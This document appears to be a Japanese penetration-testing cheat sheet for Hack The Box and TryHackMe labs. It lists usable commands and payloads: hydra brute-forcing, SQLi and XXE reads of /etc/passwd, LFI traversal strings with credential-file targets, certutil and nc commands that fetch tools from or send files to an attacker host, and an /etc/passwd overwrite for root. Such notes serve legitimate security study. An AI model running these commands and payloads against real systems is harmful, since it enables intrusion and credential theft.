BurpのProxy機能とはWebアプリケーションの通信でサーバにリクエストを送信する際に、BurpがHTTP通信をキャプチャして
通信内容の閲覧や通信内容の書き換えができる機能。

なぜ、このツールを使うか？

```
もちろんブラウザ上から入力フォームやGETパラメータに脆弱性を判定する診断データを入力して
脆弱性が存在するかチェックする事もできますが、Cookieやhiddenパラメータなどは画面上からでは
診断値を挿入できず、また脆弱性の有無はレスポンスヘッダやレスポンスボディ(HTMLソースなど)を見て判定するため、
ブラウザ上からでは効率よくチェックが行えません。
そのためWebアプリケーションセキュリティ診断ではプロキシツールを使用して作業を行います
```

実践例:

```
Proxy → Option で、
アドレス、port、redirect 先のアドレスとport(nmap で開いていたport)を記入

127.0.0.1:1212  redirect: 10.10.10.56:80

curl http://127.0.0.1:1212/cgi-bin/user.sh

これで、intercept　される

```

- Intruder

payload の 4つの [type](https://portswigger.net/burp/documentation/desktop/tools/intruder/positions)

```

1. Sniper: 
positionで指定した箇所を、Payload Optionsで設定した値に1つずつ変更して送信
2. Battering Ram: 
positionで指定した箇所を、Payload Optionsで設定した値に全て変更して送信
3. Pitchfork:
positionで指定した箇所ごとに、Payload Optionsで値を設定して送信。
name=§shin§&age=§36§&address=§chiba§があった場合、name、age、addressごとに変更するものをPayload Optionsで設定します。
4. Cluster Bomb: 
positionの一つを固定しながら他を変えるのを順繰り設定していきます。
position1のPayload Optionsの値を「aaa、bbb」position2のPayload Optionsの値を「ccc, ddd」と設定した場合、始めにposition1の「aaa」が固定され、position2が「ccc, ddd」となって送信。続いてposition1が「bbb」で固定され、position2の「ccc, ddd」が送信されます

```



# パスワードクラック


### Hydra

[公式リンク](https://tools.kali.org/password-attacks/hydra)
SSHやFTPなどのサービスや、webアプリのログインフォーム(Basic認証)に対して攻撃が出来る。(ssh, ftp, http, imap, pop3)
攻撃時は、あらかじめ攻撃する値を記載したファイルを利用することが出来る

[参考記事1](https://linuxconfig.org/ssh-password-testing-with-hydra-on-kali-linux)


[参考記事2](https://medium.com/swlh/hack-the-box-cronos-writeup-w-o-metasploit-7b9453e557d0)


```
hydra -l <username or user.txt> -p <password or password.txt> 192.168.56.1 -t 4 ssh

・-l single user parameter
・-t は並列処理のタスク数宇
```

ex(tcp):

簡単なwordlist を使う

[username](https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt)

[password](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/top-passwords-shortlist.txt)

```
hydra -L user.txt -P password.txt -s 8080 10.10.12.30 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2Fbuild%2Fadmin&Submit=Sign+in:F=Invalid username or password"

s: port 指定

```

ex (ftp):
```
・username も password もわからない時。
hydra -L user.lst -P pass.lst -t 16 ターゲットIP ftp
hydra -L user.lst -P pass.lst -t 8 ターゲットIP ftp
hydra -L /usr/share/wordlists.rockyou.txt -P /usr/share/wordlists/rockyou.txt -M <targetIP> -t 4 ssh

・username わかってる時。
hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 6 ssh://192.168.1.123
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.0.1 http-post-form "/login:username=^USER^&password=^PASS^:F=failed"
hydra -l userlist.txt -P passwordlist.txt 192.168.0.107 ft
```

ex (ssh)
```
hydra -L user.lst -P pass.lst -t 4 ターゲットIP ssh

```

- crunch コマンドで、wordlist を作れる

```
crunch <最小の文字数> <最大の文字数> <オプション><文字候補>

ex: 

最小1文字、最大で6文字のパスワードで"a", "k", "n", "s"の4文字から抽出したパスワードを"wordlist"と言う名前のファイルに格納します。
crunch 1 6 akns -o wordlists

1-3文字で、0-9 のパスワード
crunch 1 3 0123456789

/home/kali に作成
crunch 3 3 12345 >> /home/kali/pass.txt
crunch 3 3 12345 -o pass.txt (これでもおk、pwd が /home/kali の場合)

/usr/share/wordlists に作成 (巨大なファイルになるため、実行要注意)
crunch 3 5 0123456789abcdefghijklmnopqrstuvwxyz >> /usr/share/wordlists/rockyou.txt
```


### John the Ripper

[リンク](https://www.openwall.com/john/doc/)

### hashcat

[hash analyzer](https://www.tunnelsup.com/hash-analyzer/) でhash の type を調べる。

もしくは、[example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) から、類似のタイプを探す。

[free password hash cracker](https://crackstation.net/) で、crack できるかチェック、だめそうなら、以下の hashcat を考える。

[リンク1](https://www.iestudy.work/entry/2020/11/20/215526)

[リンク2](https://hiziriai.hatenablog.com/entry/2018/09/03/103116)

hashcatはパスワードクラックのツール。

hashcatで行うパスワードクラックは稼働しているシステムに対してアカウントがロックされるまでログイン試行を行うようなものではなく、

パスワードのハッシュ値から元のパスワードを割り出すもの。

JohnTheRipperだとハッシュファイルを作成して形式を合わせる必要があってやや面倒。 

hashcatだとハッシュ値を直接引数に渡せて便利。

```
基本的には-mオプションでハッシュ形式の指定、-aオプションで攻撃モードの指定、そしてハッシュ値を渡す。 

結果の表示には--showオプションを使用する。

hashcat -a 3 -m 0 5d41402abc4b2a76b9719d911017c592 --show

# -m 0: md5
# -a 3: ブルートフォース
# hashcat --helpでハッシュの種類のIDが見れる

```

### FcrackZip

[リンク](https://www.geeksforgeeks.org/fcrackzip-tool-crack-a-zip-file-password-in-kali-linux/)

zipファイルへのパスワードに対し、総当り攻撃してくれるアプリ


```

fcrackzip -u -l 1-5 hoge.txt

u: unzip
l: 文字数

```

事例machine: [node](https://ranakhalil101.medium.com/hack-the-box-node-writeup-w-o-metasploit-3dfb48ee4a9)

```

fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt myplace-decoded.backup

-D: select dictionary mode
-p: password file

```


# SQLインジェクション

[CheetSheet1](https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/)

[CheetSheet2](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#UnionInjections)

[リンク](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-ja-JP.md)


### UNION based injection

[Medium 記事](https://medium.com/@nyomanpradipta120/sql-injection-union-attack-9c10de1a5635)
[Qiita記事](https://qiita.com/y-araki-qiita/items/131efa82c4205e83fef8)

[リンク動画](https://www.youtube.com/watch?v=TlTMDw1KD_8)


- カラムの数を探す

```

' order by 5 -- &...

5 からincrement/decrement して、エラーから正常動作にうつった時がカラムの数

```

- enumerate


```

ex: etc/passwd をload する

admin' union select 1, load_file('/etc/passwd'), 3, 4, 5, 6 -

```


```

ex: カラムの数が2つだった場合

union select 1, order by 5 --　　　このorder by 5 を以下でおきかえる。

- username, version, databasename
concat_ws(char(32,58,32), user(), database(), version()) --

・ show all tables
group_concat(table_name,0x0a) from information_schema.tables where table_schema=database()

・ show all columns (update users to the table you are using if it is not called users)
group_concat(column_name,0x0a) from information_schema.columns where table_name='users'

・ show column data (user and password are the column names and users is the table name)
group_concat(user, 0x0a, password) from users


```

<img src="https://user-images.githubusercontent.com/39001773/133351313-ab5e4fb5-28ab-45fa-982e-5b236e98cc47.png" width = 700 />



### sqlmap

```

sqlmap -u 'http://localhost:5000/users?name=Alice' --dump

u: target url 
dump:  脆弱性があった時に、DB の内容をdumpする



パラメータをテストするときは --data オプションを使う。

sqlmap -u 'http://localhost:5000/users' --data 'name=Alice' --dump
```

[実例machine](https://medium.com/@zlkidda/hack-the-box-popcorn-11f5c7f77f5e)

ログインとパスワードの入力が必要な画面で、

 ```
 sqlmap -u http://10.10.10.6/torrent/login.php --data="password=test&username=test" --method POST --dbms MySQL --thread=5
 ```


検索フォームで背後にどんなDB が隠れているかをチェック(TryHackMe Game Zone)

```

1. 送信ボタンを押し、BurpSuite でintercept
2. 内容をcopy し、req.txt として保存
3. sqlmap -r req.txt --dbms=mysql --dump 

```


## XMLインジェクション

[PaylaodAllTheThigs リンク](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)

[XXE とは？徳丸先生の解説](https://blog.tokumaru.org/2017/)

- PHP filter を利用した攻撃

PHPでXXE攻撃する場合、以下のようにPHPフィルタを用いてBASE64エンコードするという技が知られている。

```

<?xml  version="1.0" encoding="ISO-8859-1"?>
		<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=db.php"> ]>
		<bugreport>
		<title>&xxe;</title>
		<cwe>1</cwe>
		<cvss>1</cvss>
		</bugreport>

```

- XXE による LFI / RFI
XXE による LFI / RFI（Local File Inclusion / Remote File Inclusion）では、外部実体参照を利用することで、

本来アクセスできない領域（ローカル・リモート）にあるファイルへアクセスできる。


XXE による LFI では、外部実体参照の記法を用いる。
例えば以下の XML を利用すると、脆弱なサーバ内の機密データにアクセスできる。

```

<!DOCTYPE data [
<!ENTITY secretData SYSTEM "file:///etc/passwd">
]>
<data>
  &secretData;
</data>

</data>

```

ここでは、 file:// スキームを利用することで、ローカルファイル内にある /etc/passwd というセンシティブなファイルを表示させるようなXML となっている。


## LFI

```
http://<url>/script.php?page=../../../../../../../../etc/passwd
http://<url>/script.php?page=../../../../../../../../etc/hosts
```

Examples:

```
http://example.com/index.php?page=etc/passwd
http://example.com/index.php?page=etc/passwd%00
http://example.com/index.php?page=../../etc/passwd
http://example.com/index.php?page=%252e%252e%252f
http://example.com/index.php?page=....//....//etc/passwd
```
  
  
[ライブラリ](https://github.com/takabaya-shi/LFI2RCE)

```
python lfi2rce.py --linux 10.10.10.84 /browse.php?file=../../../../../..  --error "failed to open stream" -v

```

- LFIを利用して読み取りを狙うファイル:

Linux

```
/etc/passwd
/etc/shadow
/etc/issue
/etc/group
/etc/hostname
/etc/ssh/ssh_config
/etc/ssh/sshd_config
/root/.ssh/id_rsa
/root/.ssh/authorized_keys
/home/user/.ssh/authorized_keys
/home/user/.ssh/id_rsa
```


Windows

```
/boot.ini
/autoexec.bat
/windows/system32/drivers/etc/hosts
/windows/repair/S
```


## SSRF

[解説記事](https://yamory.io/blog/about-ssrf/)

[slide: SSRF基礎](https://speakerdeck.com/hasegawayosuke/ssrfji-chu?slide=9)

[リンク:](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#file) PayloadAllTheThings

[TryHackMe](https://tryhackme.com/room/ssrf)



## SSTI

[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)

[記事](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

[TryHackMe](https://tryhackme.com/room/learnssti)

[HackTheBox Spider](https://zenn.dev/vtuber/scraps/cc900752cefd1c)


疑うきっかけは、 `URL や input box` をみたとき。

具体的には、GET /users/profile/testしたときに、「Hello, test!」と表示されるのをみたとき。

その場合、Fuzzing： `${{<%[%'"}}%` を入力し、internal server error がでたら、SSTIのサイン

identity, exploitについては、PayloadAllTheThings 参照


## Tunneling

### chisel

chiselは、WebSocketを使用したGo言語で作られたTCPトンネリングツールであり、トンネリング通信はSSHで暗号化されている。

[動画](https://www.youtube.com/watch?v=Yp4oxoQIBAM&t=1469s)

[日本語記事](https://www.lac.co.jp/lacwatch/people/20200212_002127.html)

<img src="https://user-images.githubusercontent.com/39001773/132415568-8f9573e4-012f-47f1-8e3a-7dcd041f566d.png" width=400>

```
kali:./chisel server -p 8000 -reverse -v

strapi: ./chisel client 10.10.14.23:8000 R:8001:localhost:8000
(ただ、kali上で、netstat すると、全て(0.0.0.0)の8001への接続で、strapi上の8000のサービスへのアクセスができてしまうので、セキュリティがまずいので、以下のコマンド)

strapi: ./chisel client 10.10.14.23:8000 R:127.0.0.1:8001:localhost:8000

```

## リバースエンジニアリング

[buffer overflow 解説記事](https://cd6629.gitbook.io/ctfwriteups/oscp/buffer-overflow-wlk#overwriting-function-pointers)

### radare2

[公式](https://github.com/radareorg/radare2)

[解説記事1(基礎)](https://www.bioerrorlog.work/entry/reverse-engineering-ep5-radare2)

[解説記事2(応用)](https://takuzoo3868.hatenablog.com/entry/radare2_love)


```

$ radare2 rev100

- 表層解析
[0x080483a0]> iI   # i: informationコマンド、import,export,string情報をえる
[0x080483a0]> ii  
[0x080483a0]> iE   
[0x080483a0]> iz   

- 静的解析
[0x080483a0]> aaa # autoname function"をすべて解析するコマンド
[0x080483a0]> afl # main関数が見つかる
[0x080483a0]> s main  # s(seek)コマンドでmain関数に移動
[0x0804849d]> pdc # 逆アセンブル(C言語like  pdf でアセンブリ言語にできる)

[CTF 問題](https://www.serotoninpower.club/archives/894/#q21-reversing-reversing-easy)

```

# Windowsコマンド


### Windows コマンド集
[リンク](https://windows.command-ref.com/cmd-dir.html)


### ファイル探索

Windws:

```
search -f user.txt
```


### Windows server から、powershell 使わずにファイルをdownload したい

[リンク: 15分20秒](https://www.youtube.com/watch?v=LN5ORLHaqXI)

```

exe: 欲しいファイルが winPEAS64.exe
Linux で port 8000 で simpleHttpserver起動後

1. powershell あり
powershell -c wget "http://10.8.219.23:8000/winPEASx86.exe" -outfile "winPEAS.exe"

2. powershell  なし
certutil -urlcache -f http://ip:8000/winPEASx64.exe winPEASx64.exe

-f: 特定の URL のフェッチとキャッシュの更新を強制する。

```

### Windows で user.txt を探したい

```
where /r . user.txt

tree /f /a \Users


```

### Windows でfileを実行したい

```
ex: filename.exe を実行
.\filename.exe

```

### Windows でサービスを停止したり、開始したりしたい

[sc コマンド](https://windows.command-ref.com/cmd-sc.html)

```
sc stop hogeservice



```

### 権限を編集したい

[icacls　コマンド](https://webbibouroku.com/Blog/Article/file-access-controll)




# 便利コマンド

### searchsploit -m で、

- searchsploit -m

exploit を current directory へ copy

```
─$ searchsploit PRTG             
------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                             |  Path
------------------------------------------------------------------------------------------- ---------------------------------
PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution                       | windows/webapps/46527.sh
PRTG Network Monitor < 18.1.39.1648 - Stack Overflow (Denial of Service)                   | windows_x86/dos/44500.py
PRTG Traffic Grapher 6.2.1 - 'url' Cross-Site Scripting                                    | java/webapps/34108.txt


searchsploit -m windows/webapps/46527.sh

  -m, --mirror   [EDB-ID]    Mirror (aka copies) an exploit to the current working directory.

```

- searchsploit -x

```
searchsploit -x windows/remote/41738.py
-x エクスプロイトの中身を見る
```

### シェル整形

[コマンド 一覧](https://netsec.ws/?p=337)


[良記事](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)

![71A18974-3465-4E7F-B7FA-E875BFA88A1C](https://user-images.githubusercontent.com/39001773/122586864-1fad7580-d098-11eb-877a-2be7f865fc62.png)



```
python -c 'import pty; pty.spawn("/bin/bash")'
```

-c: command
              Specify  the  command  to  execute.

pty: pty モジュールは擬似端末(他のプロセスを実行してその制御をしている端末をプログラムで読み書きする)
     を制御する操作を定義

pty.spawn: プロセスを生成して制御端末を現在のプロセスの標準入出力に接続する。
            これは制御端末を読もうとするプログラムをごまかすために利用される。
            

```

python -c 'import pty; pty.spawn("/bin/bash")'

ctrl + z

stty raw -echo; fg
enter


・TERM variable not set と言われたら・・・
kali terminal で、

echo $TERM  (example response: xterm-256color)
侵入先のshellで、  export TERM=xterm-256color

```




### root 権限か確かめる

```

sudo id 
sudo groups

・sudo -l 
-l:	sudoを実行するユーザーに許可されているコマンドを一覧表示する。

・root になる
sudo su
su: switch user

sudo -i  でもできる
i: rootユーザーのデフォルトのシェルをログインシェルとして実行する

```

### python のlibrary がない

```
ex: impacket
 
github のreleases へいき、
wget https://github.com/SecureAuthCorp/impacket/releases/download/impacket_0_9_21/impacket-0.9.21.tar.gz

tar -zxvf impacket-0.9.21.tar.gz
cd impacket-0.9.21
pip install .

```


### PsExec
コマンドラインを、リモートで実行できる。
[リンク](https://medium.com/@jjlovesstudying/windows-version-of-ssh-using-psexec-bff7942db91b)


# その他

- nc でファイル転送したい

[リンク]（https://eel3.hatenablog.com/entry/20160422/1461336229）

```

ex:

kali側:
nc -lvnp 1337 > backup_ssh.tgz

進入先のサーバー側:
nc 10.10.14.2 1337 < /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz

```


- etc/passwd を書き換える

[openssl](https://www.mkssoftware.com/docs/man1/openssl_passwd.1.asp)

```
(イエラエセキュリティ勉強会ででてきた)

open -1 -salt xxxxxxxx password;
→  xxj31ZMTZzkVA

root:x:....
hiro:xxj31ZMTZzkVA：....

そのあとに、su hiro する。

```

- github のremote のコードを、local に落としたい。

→ 欲しいディレクトリにあるファイルに移動
→ raw をクリック
→ ex: wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh


* releases のbinary をdownload したい場合。

対象で右クリック　→ copy link location でurl 取得
wget "url"


- eval 関数について

eval関数は、引数に指定した文字列をpythonプログラムコードとして評価・実行する機能をもつ関数となる。
特に組み込みのeval関数では、悪意のあるユーザーから受け取った文字列をプログラムとして実行してしまいシステムに侵入される等の脆弱性、危険性がある。
そのため外部からの文字列を受け取る場合、組み込みのeval関数は使用してはならない。

```
例）pythonからLinuxのコマンドを実行出来てしまう、、、

>>> eval("__import__('os').system('uname -a')", {})
Linux ubuntu 4.4.0-17763-................

```



- 改行などがうまく表示できていない時

/bin/sh^M : bad interpreter: No such file or directory 

`dos2unix ファイル名`


